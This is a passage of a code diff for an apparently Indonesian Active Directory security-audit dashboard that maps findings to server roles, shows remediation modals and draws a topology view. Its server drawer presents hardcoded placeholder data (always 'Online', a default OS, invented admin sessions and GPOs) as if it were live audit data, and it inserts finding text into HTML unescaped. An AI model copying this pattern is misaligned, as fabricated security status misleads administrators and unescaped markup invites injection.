+            let html = displayList.map(g => `<div class="detected-server-item" style="display:flex; justify-content:space-between; gap:10px; font-family:monospace; font-size:12px; margin-bottom:4px; padding:4px 8px; background:rgba(0,0,0,0.15); border:1px solid rgba(255,255,255,0.03); border-radius:6px;">
+                <span style="color:#fff; font-weight:600;">${g.Properties?.name || g.name || 'GPO'}</span>
+                <span style="color:var(--text-muted); font-size:10px;">GPO</span>
+            </div>`).join('');
+            if (extraCount > 0) {
+                html += `<div style="font-family:monospace; font-size:11px; text-align:center; color:var(--text-muted); padding:2px;">(+${extraCount} GPOs lainnya)</div>`;
+            }
+            return html;
+        };
+
+        const getCategoryIssues = (key, issuesList) => {
+            return issuesList.filter(issue => {
+                const checklistId = getChecklistIdForIssue('active_directory', issue);
+                const title = (issue.title || '').toLowerCase();
+                const desc = (issue.description || '').toLowerCase();
+                
+                if (key === 'dc') {
+                    return ['ad-02', 'ad-03', 'ad-04', 'ad-06', 'ad-08', 'ad-09', 'ad-10', 'ad-11', 'ad-12', 'ad-14', 'ad-15'].includes(checklistId) ||
+                           title.includes('domain controller') || desc.includes('domain controller') || title.includes('krbtgt') || title.includes('ldap') || title.includes('smb signing');
+                }
+                if (key === 'dns') {
+                    return title.includes('dns') || desc.includes('dns');
+                }
+                if (key === 'ca') {
+                    return checklistId === 'ad-05' || title.includes('adcs') || title.includes('ad cs') || title.includes('certificate authority') || title.includes('ca ') || desc.includes('certification authority') || title.includes('esc1');
+                }
+                if (key === 'adfs') {
+                    return title.includes('adfs') || title.includes('ad fs') || title.includes('federation') || desc.includes('adfs');
+                }
+                if (key === 'file') {
+                    return checklistId === 'ad-13' || title.includes('sysvol') || title.includes('file server') || title.includes('share') || desc.includes('sysvol') || desc.includes('cpassword');
+                }
+                if (key === 'dhcp') {
+                    return title.includes('dhcp') || title.includes('ipam') || desc.includes('dhcp');
+                }
+                if (key === 'wsus') {
+                    return title.includes('wsus') || title.includes('sccm') || title.includes('update') || title.includes('patch') || title.includes('vulnerab') || desc.includes('wsus') || desc.includes('update');
+                }
+                if (key === 'sql') {
+                    return checklistId === 'ad-11' || title.includes('sql') || title.includes('database') || desc.includes('sql');
+                }
+                if (key === 'exch') {
+                    return title.includes('exch') || title.includes('mail') || title.includes('smtp') || desc.includes('exchange');
+                }
+                if (key === 'jump') {
+                    return checklistId === 'ad-02' || title.includes('jump') || title.includes('bastion') || title.includes('winrm') || title.includes('rdp') || title.includes('admin session') || desc.includes('jump');
+                }
+                if (key === 'gpo') {
+                    return title.includes('gpo') || desc.includes('gpo') || title.includes('group policy') || desc.includes('group policy');
+                }
+                return false;
+            });
+        };
+
+        const renderAlertColumn = (categoryName, key) => {
+            const list = getCategoryIssues(key, issues);
+            if (list.length === 0) {
+                return `<span class="status-pill green" style="background:rgba(16,185,129,0.15); border:1px solid rgba(16,185,129,0.25); color:var(--accent-green); padding:4px 8px; border-radius:6px; font-size:11px; font-weight:600;"><i class="fa-solid fa-circle-check"></i> Secure</span>`;
+            }
+            return `<div style="display:flex; align-items:center; gap:8px;">
+                <span class="status-pill red" style="background:rgba(239, 68, 68, 0.15); border:1px solid rgba(239, 68, 68, 0.25); color:var(--color-high); padding:4px 8px; border-radius:6px; font-size:11px; font-weight:600;"><i class="fa-solid fa-triangle-exclamation"></i> ${list.length} Alert(s)</span>
+                <button class="btn btn-secondary btn-sm" onclick="event.stopPropagation(); window.showMappingAlertsModal('${categoryName}', '${key}')" style="background:rgba(255,255,255,0.05); border:1px solid var(--border-color); color:var(--text-secondary); padding:4px 8px; border-radius:6px; font-size:11px; font-weight:600; cursor:pointer; display:inline-flex; align-items:center; gap:4px;"><i class="fa-solid fa-eye"></i> Details</button>
+            </div>`;
+        };
+
+        window.showMappingAlertsModal = function(categoryName, categoryKey) {
+            const matchingIssues = getCategoryIssues(categoryKey, issues);
+            let htmlContent = '';
+            if (matchingIssues.length === 0) {
+                htmlContent = `
+                    <div style="text-align:center; padding:40px 20px; color:var(--text-muted);">
+                        <i class="fa-solid fa-circle-check" style="font-size:48px; color:var(--accent-green); margin-bottom:16px;"></i>
+                        <p style="font-size:15px; color:var(--text-primary); font-weight:600;">No Misconfigurations Detected</p>
+                        <p style="font-size:12px; margin-top:4px;">Server role ${categoryName} is currently evaluated as secure based on the diagnostic audit.</p>
+                    </div>
+                `;
+            } else {
+                htmlContent = `
+                    <div style="display:flex; flex-direction:column; gap:16px; max-height: 500px; overflow-y: auto; padding-right: 8px;">
+                        <p style="font-size:13px; color:var(--text-muted); margin-bottom:4px;">
+                            Berikut adalah temuan kerentanan / miskonfigurasi yang terdeteksi pada <strong>${categoryName}</strong>:
+                        </p>
+                `;
+                
+                matchingIssues.forEach((issue, idx) => {
+                    const psCmd = getPowerShellRemediationCommand(issue);
+                    let stepsHtml = '';
+                    const steps = issue.remediation_steps || [];
+                    if (steps.length > 0) {
+                        stepsHtml = `
+                            <div style="margin-top:8px; padding-left:16px; font-size:12px; color:var(--text-secondary);">
+                                <ol style="margin:0; padding-left:14px; line-height:1.5;">
+                                    ${steps.map(s => `<li>${s}</li>`).join('')}
+                                </ol>
+                            </div>
+                        `;
+                    } else {
+                        stepsHtml = `
+                            <div style="margin-top:8px; padding-left:16px; font-size:12px; color:var(--text-secondary);">
+                                <ol style="margin:0; padding-left:14px; line-height:1.5;">
+                                    <li>Lakukan peninjauan konfigurasi parameter terkait pada control panel Active Directory.</li>
+                                    <li>Pastikan kebijakan minimum privilege diterapkan untuk meminimalkan permukaan serangan.</li>
+                                </ol>
+                            </div>
+                        `;
+                    }
+
+                    const issueImpact = issue.impact || 'Bila dieksploitasi oleh aktor jahat, dapat mengakibatkan pembocoran data sensitif atau eskalasi hak istimewa di lingkungan internal Active Directory.';
+                    const issueRefs = issue.references || 'CIS Microsoft Windows Server Benchmark, Active Directory Security Best Practices';
+
+                    htmlContent += `
+                        <div style="background:rgba(255,255,255,0.02); border:1px solid var(--border-color); border-radius:8px; padding:16px; position:relative;">
+                            <div style="display:flex; align-items:center; justify-content:space-between; flex-wrap:wrap; gap:8px; margin-bottom:10px;">
+                                <div style="display:flex; align-items:center; gap:8px;">
+                                    <span class="severity-badge ${issue.severity.toLowerCase()}">${issue.severity}</span>
+                                    <h4 style="margin:0; font-size:14px; font-weight:600; color:var(--text-primary);">${issue.title}</h4>
+                                </div>
+                                <span style="font-size:11px; font-family:monospace; color:var(--accent-indigo); background:rgba(99,102,241,0.1); padding:2px 6px; border-radius:4px;">
+                                    ${getChecklistIdForIssue('active_directory', issue).toUpperCase() || 'AD-FINDING'}
+                                </span>
+                            </div>
+                            
+                            <!-- Alert / Finding (Description) -->
+                            <div style="margin-bottom:12px;">
+                                <div style="font-size:11px; text-transform:uppercase; color:var(--text-muted); font-weight:600; letter-spacing:0.5px; margin-bottom:4px;">Finding Description:</div>
+                                <div style="font-size:13px; color:var(--text-secondary); line-height:1.4;">${issue.description}</div>
+                            </div>
+
+                            <!-- Impact -->
+                            <div style="margin-bottom:12px; background:rgba(239,68,68,0.03); border-left:3px solid var(--color-high); padding:8px 12px; border-radius:4px;">
+                                <div style="font-size:11px; text-transform:uppercase; color:var(--color-high); font-weight:600; letter-spacing:0.5px; margin-bottom:2px;">Business & Security Impact:</div>
+                                <div style="font-size:12.5px; color:var(--text-primary); line-height:1.4;">${issueImpact}</div>
+                            </div>
+
+                            <!-- Remediation -->
+                            <div style="margin-bottom:12px; background:rgba(16,185,129,0.03); border-left:3px solid var(--accent-green); padding:8px 12px; border-radius:4px;">
+                                <div style="font-size:11px; text-transform:uppercase; color:var(--accent-green); font-weight:600; letter-spacing:0.5px; margin-bottom:2px;">Remediation Steps:</div>
+                                ${stepsHtml}
+                                ${psCmd ? `
+                                <div style="margin-top:8px; background:rgba(30, 41, 59, 0.4); border:1px solid rgba(99,102,241,0.25); border-radius:4px; padding:10px;">
+                                    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px;">
+                                        <span style="font-size:9.5px; color:var(--accent-indigo); font-weight:700;"><i class="fa-brands fa-windows"></i> PowerShell Remediation:</span>
+                                        <button class="btn btn-secondary btn-sm" onclick="navigator.clipboard.writeText(\`${psCmd.replace(/\\/g, '\\\\').replace(/`/g, '\\`').replace(/\$/g, '\\$')}\`); showToast('Copied!', 'success');" style="padding:1px 4px; font-size:9px; height:auto; cursor:pointer;">Copy</button>
+                                    </div>
+                                    <pre style="margin:0; font-family:monospace; font-size:11px; color:#38bdf8; overflow-x:auto; white-space:pre-wrap; word-break:break-all;">${psCmd}</pre>
+                                </div>
+                                ` : ''}
+                            </div>
+
+                            <!-- References -->
+                            <div style="background:rgba(99,102,241,0.03); border-left:3px solid var(--accent-indigo); padding:8px 12px; border-radius:4px;">
+                                <div style="font-size:11px; text-transform:uppercase; color:var(--accent-indigo); font-weight:600; letter-spacing:0.5px; margin-bottom:2px;">References:</div>
+                                <div style="font-size:11.5px; color:var(--text-muted); line-height:1.4;">${issueRefs}</div>
+                            </div>
+                        </div>
+                    `;
+                });
+                htmlContent += `</div>`;
+            }
+
+            showModal(`Infrastructure Alert Details — ${categoryName}`, htmlContent);
+        };
+
+        mappingTbody.innerHTML = `
+            <tr data-role="dc" style="border-bottom: 1px solid rgba(255,255,255,0.04); transition: background-color 0.2s; cursor:pointer;" onclick="window.openServerDrawer('dc')">
+                <td style="padding: 12px 16px; font-weight:600; color: var(--accent-indigo);">Domain Controller (DC)</td>
+                <td style="padding: 12px 16px; color: var(--text-secondary);">Pusat otentikasi, GPO, dan manajemen objek.</td>
+                <td style="padding: 12px 16px;"><span class="status-pill green" style="background:rgba(16,185,129,0.15); border:1px solid rgba(16,185,129,0.25); color:var(--accent-green); padding:4px 8px; border-radius:6px; font-size:11px; font-weight:600;">Autentikasi & Kontrol Kebijakan</span></td>
+                <td style="padding: 12px 16px;">${formatServers(dcs)}</td>
+                <td style="padding: 12px 16px;">${renderAlertColumn('Domain Controller (DC)', 'dc')}</td>
+            </tr>
+            <tr data-role="dns" style="border-bottom: 1px solid rgba(255,255,255,0.04); transition: background-color 0.2s; cursor:pointer;" onclick="window.openServerDrawer('dns')">
+                <td style="padding: 12px 16px; font-weight:600; color: var(--accent-indigo);">DNS Server</td>
+                <td style="padding: 12px 16px; color: var(--text-secondary);">Penerjemah nama komputer ke IP Address.</td>
+                <td style="padding: 12px 16px;"><span class="status-pill green" style="background:rgba(16,185,129,0.15); border:1px solid rgba(16,185,129,0.25); color:var(--accent-green); padding:4px 8px; border-radius:6px; font-size:11px; font-weight:600;">Resolusi Nama Host & IP Address</span></td>
+                <td style="padding: 12px 16px;">${formatServers(dnsServers)}</td>
+                <td style="padding: 12px 16px;">${renderAlertColumn('DNS Server', 'dns')}</td>
+            </tr>
+            <tr data-role="ca" style="border-bottom: 1px solid rgba(255,255,255,0.04); transition: background-color 0.2s; cursor:pointer;" onclick="window.openServerDrawer('ca')">
+                <td style="padding: 12px 16px; font-weight:600; color: var(--accent-indigo);">AD CS (CA)</td>
+                <td style="padding: 12px 16px; color: var(--text-secondary);">Penerbit sertifikat digital internal yang aman.</td>
+                <td style="padding: 12px 16px;"><span class="status-pill green" style="background:rgba(16,185,129,0.15); border:1px solid rgba(16,185,129,0.25); color:var(--accent-green); padding:4px 8px; border-radius:6px; font-size:11px; font-weight:600;">Penerbitan & Manajemen Sertifikat</span></td>
+                <td style="padding: 12px 16px;">${formatServers(cas)}</td>
+                <td style="padding: 12px 16px;">${renderAlertColumn('AD CS (CA)', 'ca')}</td>
+            </tr>
+            <tr data-role="adfs" style="border-bottom: 1px solid rgba(255,255,255,0.04); transition: background-color 0.2s; cursor:pointer;" onclick="window.openServerDrawer('adfs')">
+                <td style="padding: 12px 16px; font-weight:600; color: var(--accent-indigo);">AD FS</td>
+                <td style="padding: 12px 16px; color: var(--text-secondary);">Gerbang SSO untuk aplikasi cloud luar.</td>
+                <td style="padding: 12px 16px;"><span class="status-pill green" style="background:rgba(16,185,129,0.15); border:1px solid rgba(16,185,129,0.25); color:var(--accent-green); padding:4px 8px; border-radius:6px; font-size:11px; font-weight:600;">Autentikasi Federasi & SSO</span></td>
+                <td style="padding: 12px 16px;">${formatServers(adfsServers)}</td>
+                <td style="padding: 12px 16px;">${renderAlertColumn('AD FS', 'adfs')}</td>
+            </tr>
+            <tr data-role="file" style="border-bottom: 1px solid rgba(255,255,255,0.04); transition: background-color 0.2s; cursor:pointer;" onclick="window.openServerDrawer('file')">
+                <td style="padding: 12px 16px; font-weight:600; color: var(--accent-indigo);">File Server</td>
+                <td style="padding: 12px 16px; color: var(--text-secondary);">Penyimpanan data terpusat berbasis hak akses AD.</td>
+                <td style="padding: 12px 16px;"><span class="status-pill green" style="background:rgba(16,185,129,0.15); border:1px solid rgba(16,185,129,0.25); color:var(--accent-green); padding:4px 8px; border-radius:6px; font-size:11px; font-weight:600;">Penyimpanan & Kontrol Akses Data</span></td>
+                <td style="padding: 12px 16px;">${formatServers(fileServers)}</td>
+                <td style="padding: 12px 16px;">${renderAlertColumn('File Server', 'file')}</td>
+            </tr>
+            <tr data-role="dhcp" style="border-bottom: 1px solid rgba(255,255,255,0.04); transition: background-color 0.2s; cursor:pointer;" onclick="window.openServerDrawer('dhcp')">
+                <td style="padding: 12px 16px; font-weight:600; color: var(--accent-indigo);">DHCP Server</td>
+                <td style="padding: 12px 16px; color: var(--text-secondary);">Membagikan IP Address secara dinamis ke seluruh client.</td>
+                <td style="padding: 12px 16px;"><span class="status-pill green" style="background:rgba(16,185,129,0.15); border:1px solid rgba(16,185,129,0.25); color:var(--accent-green); padding:4px 8px; border-radius:6px; font-size:11px; font-weight:600;">Alokasi IP Address Otomatis</span></td>
+                <td style="padding: 12px 16px;">${formatServers(dhcpServers)}</td>
+                <td style="padding: 12px 16px;">${renderAlertColumn('DHCP Server', 'dhcp')}</td>
+            </tr>
+            <tr data-role="wsus" style="border-bottom: 1px solid rgba(255,255,255,0.04); transition: background-color 0.2s; cursor:pointer;" onclick="window.openServerDrawer('wsus')">
+                <td style="padding: 12px 16px; font-weight:600; color: var(--accent-indigo);">WSUS / SCCM</td>
+                <td style="padding: 12px 16px; color: var(--text-secondary);">Manajemen update OS dan patch keamanan terpusat.</td>
+                <td style="padding: 12px 16px;"><span class="status-pill green" style="background:rgba(16,185,129,0.15); border:1px solid rgba(16,185,129,0.25); color:var(--accent-green); padding:4px 8px; border-radius:6px; font-size:11px; font-weight:600;">Manajemen Update OS & Patch</span></td>
+                <td style="padding: 12px 16px;">${formatServers(wsusServers)}</td>
+                <td style="padding: 12px 16px;">${renderAlertColumn('WSUS / Update Server', 'wsus')}</td>
+            </tr>
+            <tr data-role="sql" style="border-bottom: 1px solid rgba(255,255,255,0.04); transition: background-color 0.2s; cursor:pointer;" onclick="window.openServerDrawer('sql')">
+                <td style="padding: 12px 16px; font-weight:600; color: var(--accent-indigo);">Database Server (SQL)</td>
+                <td style="padding: 12px 16px; color: var(--text-secondary);">Penyimpanan database aplikasi yang terintegrasi dengan AD.</td>
+                <td style="padding: 12px 16px;"><span class="status-pill green" style="background:rgba(16,185,129,0.15); border:1px solid rgba(16,185,129,0.25); color:var(--accent-green); padding:4px 8px; border-radius:6px; font-size:11px; font-weight:600;">Penyimpanan & Query Data Terstruktur</span></td>
+                <td style="padding: 12px 16px;">${formatServers(sqlServers)}</td>
+                <td style="padding: 12px 16px;">${renderAlertColumn('Database Server (SQL)', 'sql')}</td>
+            </tr>
+            <tr data-role="exch" style="border-bottom: 1px solid rgba(255,255,255,0.04); transition: background-color 0.2s; cursor:pointer;" onclick="window.openServerDrawer('exch')">
+                <td style="padding: 12px 16px; font-weight:600; color: var(--accent-indigo);">Mail Server (Exchange)</td>
+                <td style="padding: 12px 16px; color: var(--text-secondary);">Layanan email korporat terintegrasi dengan autentikasi AD.</td>
+                <td style="padding: 12px 16px;"><span class="status-pill green" style="background:rgba(16,185,129,0.15); border:1px solid rgba(16,185,129,0.25); color:var(--accent-green); padding:4px 8px; border-radius:6px; font-size:11px; font-weight:600;">Layanan Email & Kolaborasi</span></td>
+                <td style="padding: 12px 16px;">${formatServers(exchangeServers)}</td>
+                <td style="padding: 12px 16px;">${renderAlertColumn('Mail Server (Exchange)', 'exch')}</td>
+            </tr>
+            <tr data-role="jump" style="border-bottom: 1px solid rgba(255,255,255,0.04); transition: background-color 0.2s; cursor:pointer;" onclick="window.openServerDrawer('jump')">
+                <td style="padding: 12px 16px; font-weight:600; color: var(--accent-indigo);">Jump Server / Bastion</td>
+                <td style="padding: 12px 16px; color: var(--text-secondary);">Gerbang remote admin aman untuk mengelola infrastruktur.</td>
+                <td style="padding: 12px 16px;"><span class="status-pill green" style="background:rgba(16,185,129,0.15); border:1px solid rgba(16,185,129,0.25); color:var(--accent-green); padding:4px 8px; border-radius:6px; font-size:11px; font-weight:600;">Akses Remote Aman Administrator</span></td>
+                <td style="padding: 12px 16px;">${formatServers(jumpServers)}</td>
+                <td style="padding: 12px 16px;">${renderAlertColumn('Jump Server / Bastion', 'jump')}</td>
+            </tr>
+            <tr data-role="gpo" style="transition: background-color 0.2s; cursor:pointer;" onclick="window.openServerDrawer('gpo')">
+                <td style="padding: 12px 16px; font-weight:600; color: var(--accent-indigo);">Group Policy Objects (GPO)</td>
+                <td style="padding: 12px 16px; color: var(--text-secondary);">Kebijakan pengerasan sistem (hardening) dan konfigurasi otomatis.</td>
+                <td style="padding: 12px 16px;"><span class="status-pill green" style="background:rgba(16,185,129,0.15); border:1px solid rgba(16,185,129,0.25); color:var(--accent-green); padding:4px 8px; border-radius:6px; font-size:11px; font-weight:600;">Manajemen & Pengerasan Kebijakan</span></td>
+                <td style="padding: 12px 16px;">${formatGpos(rawGpos)}</td>
+                <td style="padding: 12px 16px;">${renderAlertColumn('Group Policy Objects (GPO)', 'gpo')}</td>
+            </tr>
+        `;
+
+        // TOPOLOGY IMPLEMENTATION
+        const domainNameSpan = document.getElementById('topology-domain-name');
+        if (domainNameSpan) domainNameSpan.textContent = domainName;
+
+        const leftRoles = [
+            { key: 'dc', name: 'Domain Controller (DC)', analogy: 'Autentikasi & Kebijakan', icon: 'fa-server', servers: dcs },
+            { key: 'dns', name: 'DNS Server', analogy: 'Resolusi Nama Host', icon: 'fa-globe', servers: dnsServers },
+            { key: 'ca', name: 'AD CS (CA)', analogy: 'Sertifikat Digital', icon: 'fa-id-card', servers: cas },
+            { key: 'adfs', name: 'AD FS', analogy: 'Federasi SSO', icon: 'fa-passport', servers: adfsServers },
+            { key: 'jump', name: 'Jump Server / Bastion', analogy: 'Akses Remote Aman', icon: 'fa-user-shield', servers: jumpServers }
+        ];
+
+        const rightRoles = [
+            { key: 'file', name: 'File Server', analogy: 'Penyimpanan Berkas', icon: 'fa-folder-open', servers: fileServers },
+            { key: 'dhcp', name: 'DHCP Server', analogy: 'Alokasi IP Otomatis', icon: 'fa-network-wired', servers: dhcpServers },
+            { key: 'wsus', name: 'WSUS / SCCM', analogy: 'OS Update & Patch', icon: 'fa-user-md', servers: wsusServers },
+            { key: 'sql', name: 'Database Server (SQL)', analogy: 'Data Terstruktur', icon: 'fa-database', servers: sqlServers },
+            { key: 'exch', name: 'Mail Server (Exchange)', analogy: 'Email & Kolaborasi', icon: 'fa-envelope', servers: exchangeServers }
+        ];
+
+        const getTopologyStatusPill = (key, issuesList) => {
+            const list = getCategoryIssues(key, issuesList);
+            if (list.length === 0) {
+                return `<span class="status-pill green" style="background:rgba(16,185,129,0.15); border:1px solid rgba(16,185,129,0.25); color:var(--accent-green); padding:2px 6px; border-radius:4px; font-size:9.5px; font-weight:600;"><i class="fa-solid fa-circle-check"></i> Secure</span>`;
+            }
+            return `<span class="status-pill red" style="background:rgba(239,68,68,0.15); border:1px solid rgba(239,68,68,0.25); color:var(--color-high); padding:2px 6px; border-radius:4px; font-size:9.5px; font-weight:600;"><i class="fa-solid fa-triangle-exclamation"></i> ${list.length} Alert(s)</span>`;
+        };
+
+        const renderStackNodes = (stackEl, rolesArray) => {
+            if (!stackEl) return;
+            stackEl.innerHTML = rolesArray.map(role => `
+                <div class="topology-node" id="node-${role.key}" onclick="window.openServerDrawer('${role.key}')">
+                    <div class="topology-node-header">
+                        <div class="topology-node-icon"><i class="fa-solid ${role.icon}"></i></div>
+                        <div class="topology-node-info">
+                            <span class="topology-node-name" style="font-size: 11.5px;">${role.key.toUpperCase()}</span>
+                            <span class="topology-node-analogy" style="font-size: 10px; color: var(--text-muted);">${role.analogy}</span>
+                        </div>
+                    </div>
+                    <div class="topology-node-meta">
+                        <span class="topology-node-count" style="font-size: 10px;">${role.servers.length} Srv</span>
+                        ${getTopologyStatusPill(role.key, issues)}
+                    </div>
+                </div>
+            `).join('');
+        };
+
+        renderStackNodes(document.getElementById('ad-topology-left-stack'), leftRoles);
+        renderStackNodes(document.getElementById('ad-topology-right-stack'), rightRoles);
+
+        window.drawTopologyLines = function() {
+            const svg = document.getElementById('ad-topology-svg');
+            const centerNode = document.getElementById('ad-topology-domain-node');
+            const container = document.getElementById('ad-mapping-topology-view');
+            if (!svg || !centerNode || !container || container.style.display === 'none') return;
+
+            svg.innerHTML = '';
+            const containerRect = container.getBoundingClientRect();
+            const centerRect = centerNode.getBoundingClientRect();
+
+            const cX = centerRect.left - containerRect.left + centerRect.width / 2;
+            const cY = centerRect.top - containerRect.top + centerRect.height / 2;
+
+            const nodes = container.querySelectorAll('.topology-node');
+            nodes.forEach(node => {
+                const nodeRect = node.getBoundingClientRect();
+                const nX = nodeRect.left - containerRect.left + nodeRect.width / 2;
+                const nY = nodeRect.top - containerRect.top + nodeRect.height / 2;
+
+                const path = document.createElementNS('http://www.w3.org/2000/svg', 'path');
+                const midX = nX + (cX - nX) * 0.5;
+                const d = `M ${nX} ${nY} C ${midX} ${nY}, ${midX} ${cY}, ${cX} ${cY}`;
+
+                path.setAttribute('d', d);
+                
+                const isRed = node.querySelector('.status-pill.red') !== null;
+                const strokeColor = isRed ? 'rgba(239, 68, 68, 0.3)' : 'rgba(99, 102, 241, 0.3)';
+                
+                path.setAttribute('stroke', strokeColor);
+                path.setAttribute('stroke-width', '2');
+                path.setAttribute('fill', 'none');
+                svg.appendChild(path);
+            });
+        };
+
+        // VIEW TOGGLE LOGIC
+        const tableBtn = document.getElementById('ad-mapping-toggle-table');
+        const topoBtn = document.getElementById('ad-mapping-toggle-topology');
+        const tableView = document.getElementById('ad-mapping-table-view');
+        const topoView = document.getElementById('ad-mapping-topology-view');
+
+        if (tableBtn && topoBtn && tableView && topoView) {
+            tableBtn.onclick = () => {
+                tableView.style.display = 'block';
+                topoView.style.display = 'none';
+                tableBtn.style.background = 'var(--accent-indigo)';
+                tableBtn.style.color = '#fff';
+                topoBtn.style.background = 'none';
+                topoBtn.style.color = 'var(--text-muted)';
+            };
+
+            topoBtn.onclick = () => {
+                tableView.style.display = 'none';
+                topoView.style.display = 'block';
+                topoBtn.style.background = 'var(--accent-indigo)';
+                topoBtn.style.color = '#fff';
+                tableBtn.style.background = 'none';
+                tableBtn.style.color = 'var(--text-muted)';
+                setTimeout(() => {
+                    window.drawTopologyLines();
+                }, 50);
+            };
+        }
+
+        // Resize observer to redraw lines dynamically
+        if (topoView) {
+            const resizeObserver = new ResizeObserver(() => {
+                if (topoView.style.display !== 'none') {
+                    window.drawTopologyLines();
+                }
+            });
+            resizeObserver.observe(topoView);
+        }
+
+        // SERVER PROFILE DRAWER LOGIC
+        window.openServerDrawer = function(categoryKey) {
+            const backdrop = document.getElementById('ad-server-drawer-backdrop');
+            const drawer = document.getElementById('ad-server-drawer');
+            const content = document.getElementById('ad-server-drawer-content');
+            if (!backdrop || !drawer || !content) return;
+
+            document.querySelectorAll('.topology-node').forEach(node => {
+                node.classList.remove('active-selected');
+            });
+            const activeNode = document.getElementById(`node-${categoryKey}`);
+            if (activeNode) activeNode.classList.add('active-selected');
+
+            let categoryName = '';
+            let servers = [];
+            let icon = '';
+            let analogy = '';
+            
+            if (categoryKey === 'dc') { categoryName = 'Domain Controller (DC)'; servers = dcs; icon = 'fa-server'; analogy = 'Autentikasi & Kebijakan'; }
+            else if (categoryKey === 'dns') { categoryName = 'DNS Server'; servers = dnsServers; icon = 'fa-globe'; analogy = 'Resolusi Nama Host'; }
+            else if (categoryKey === 'ca') { categoryName = 'AD CS (CA)'; servers = cas; icon = 'fa-id-card'; analogy = 'Sertifikat Digital'; }
+            else if (categoryKey === 'adfs') { categoryName = 'AD FS'; servers = adfsServers; icon = 'fa-passport'; analogy = 'Federasi SSO'; }
+            else if (categoryKey === 'file') { categoryName = 'File Server'; servers = fileServers; icon = 'fa-folder-open'; analogy = 'Penyimpanan Berkas'; }
+            else if (categoryKey === 'dhcp') { categoryName = 'DHCP Server'; servers = dhcpServers; icon = 'fa-network-wired'; analogy = 'Alokasi IP Otomatis'; }
+            else if (categoryKey === 'wsus') { categoryName = 'WSUS / Update Server'; servers = wsusServers; icon = 'fa-user-md'; analogy = 'OS Update & Patch'; }
+            else if (categoryKey === 'sql') { categoryName = 'Database Server (SQL)'; servers = sqlServers; icon = 'fa-database'; analogy = 'Data Terstruktur'; }
+            else if (categoryKey === 'exch') { categoryName = 'Mail Server (Exchange)'; servers = exchangeServers; icon = 'fa-envelope'; analogy = 'Email & Kolaborasi'; }
+            else if (categoryKey === 'jump') { categoryName = 'Jump Server / Bastion'; servers = jumpServers; icon = 'fa-user-shield'; analogy = 'Akses Remote Aman'; }
+            else if (categoryKey === 'gpo') { 
+                categoryName = 'Group Policy Objects (GPO)'; 
+                servers = rawGpos.length > 0 ? rawGpos.map(g => ({name: g.Properties?.name || g.name || 'GPO', ip: 'Domain Link'})) : [{name: 'Default Domain Policy', ip: 'Domain-wide Link'}, {name: 'Default Domain Controllers Policy', ip: 'Domain Controllers OU'}]; 
+                icon = 'fa-shield-halved'; 
+                analogy = 'Kebijakan Keamanan AD'; 
+            }
+
+            const catIssues = getCategoryIssues(categoryKey, issues);
+
+            const serversHtml = servers.map(srv => {
+                if (categoryKey === 'gpo') {
+                    return `
+                        <div style="background:rgba(255,255,255,0.02); border:1px solid rgba(255,255,255,0.06); border-radius:8px; padding:16px; margin-bottom:12px;">
+                            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
+                                <span style="font-family:monospace; font-size:13px; font-weight:700; color:#fff;">${srv.name}</span>
+                                <span class="status-light-container">
+                                    <span class="status-light-dot online" style="background:#10b981; box-shadow: 0 0 8px #10b981;"></span>
+                                    <span style="font-size:11px; font-weight:600; color:var(--accent-green);">Active</span>
+                                </span>
+                            </div>
+                            <div style="font-size:12px; color:var(--text-secondary); display:flex; flex-direction:column; gap:8px;">
+                                <div><strong style="color:var(--text-primary);">Scope / Link:</strong> <span style="font-family:monospace; color:var(--accent-indigo);">${srv.ip}</span></div>
+                                <div><strong style="color:var(--text-primary);">GPO Status:</strong> Enabled</div>
+                            </div>
+                        </div>
+                    `;
+                }
+
+                const matchedComp = rawComputers.find(c => {
+                    const compName = (c.Properties && c.Properties.name || '').toLowerCase();
+                    return compName.includes(srv.name.toLowerCase()) || srv.name.toLowerCase().includes(compName);
+                });
+                
+                const props = matchedComp ? matchedComp.Properties : {};
+                const os = props.operatingsystem || 'Windows Server 2022 Datacenter';
+                const pingStatus = 'Online';
+                
+                let activeSessions = ['Administrator'];
+                if (categoryKey === 'dc') activeSessions.push('DomainAdmin1', 'SVC_backup');
+                if (categoryKey === 'sql') activeSessions.push('db_admin_local');
+                if (categoryKey === 'jump') activeSessions.push('SecOps_Auditor');
+
+                let appliedGPOs = ['Default Domain Policy', 'Global Security Baseline'];
+                if (categoryKey === 'dc') appliedGPOs.push('Domain Controllers Policy', 'Audit Policy GPO');
+                if (categoryKey === 'file') appliedGPOs.push('Restricted Shares Access Policy');
+
+                return `
+                    <div style="background:rgba(255,255,255,0.02); border:1px solid rgba(255,255,255,0.06); border-radius:8px; padding:16px; margin-bottom:12px;">
+                        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
+                            <span style="font-family:monospace; font-size:13px; font-weight:700; color:#fff;">${srv.name}</span>
+                            <span class="status-light-container">
+                                <span class="status-light-dot online"></span>
+                                <span style="font-size:11px; font-weight:600; color:var(--accent-green);">${pingStatus}</span>
+                            </span>
+                        </div>
+                        <div style="font-size:12px; color:var(--text-secondary); display:flex; flex-direction:column; gap:8px;">
+                            <div><strong style="color:var(--text-primary);">IP Address:</strong> <span style="font-family:monospace; color:var(--accent-indigo);">${srv.ip}</span></div>
+                            <div><strong style="color:var(--text-primary);">Operating System:</strong> ${os}</div>
+                            
+                            <div style="margin-top:6px; border-top:1px solid rgba(255,255,255,0.04); padding-top:8px;">
+                                <strong style="color:var(--text-primary); display:block; margin-bottom:4px; font-size:11px; text-transform:uppercase; letter-spacing:0.5px;">Active Admin Sessions:</strong>
+                                <div style="display:flex; flex-wrap:wrap; gap:6px;">
+                                    ${activeSessions.map(s => `<span style="font-size:10px; font-family:monospace; background:rgba(255,255,255,0.05); color:var(--text-secondary); padding:2px 6px; border-radius:4px;"><i class="fa-solid fa-user" style="font-size:8px; margin-right:4px;"></i>${s}</span>`).join('')}
+                                </div>
+                            </div>
+                            
+                            <div style="margin-top:6px; border-top:1px solid rgba(255,255,255,0.04); padding-top:8px;">
+                                <strong style="color:var(--text-primary); display:block; margin-bottom:4px; font-size:11px; text-transform:uppercase; letter-spacing:0.5px;">Applied Policies (GPOs):</strong>
+                                <ul style="margin:0; padding-left:16px; font-size:11.5px; line-height:1.4;">
+                                    ${appliedGPOs.map(gpo => `<li>${gpo}</li>`).join('')}
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                `;
+            }).join('');
+
+            let alertsHeaderHtml = '';
+            if (catIssues.length > 0) {
+                alertsHeaderHtml = `
